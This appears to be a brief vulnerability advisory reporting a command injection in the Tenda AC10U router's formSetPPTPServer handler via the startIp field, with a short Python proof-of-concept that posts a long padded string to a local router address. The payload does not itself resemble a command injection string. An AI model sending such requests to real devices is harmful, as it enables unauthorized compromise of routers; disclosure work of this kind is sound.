# command injection

## Tenda_AC10U_V1

version: V15.03.06.49

## Description:

There is a command injection in httpd/formSetPPTPServer

## Source:

you may download it from : https://www.tendacn.com/download/detail-3795.html

## Analyse:


![](20.png)

get value from startIp ,then call sprintf, cause command injection

![](22.png)


## POC
```
url = "http://192.168.1.13/goform/formSetPPTPServer"
payload = 'A'*300 + '\n'

r = requests.post(url, data={'startIp': payload})
``` 
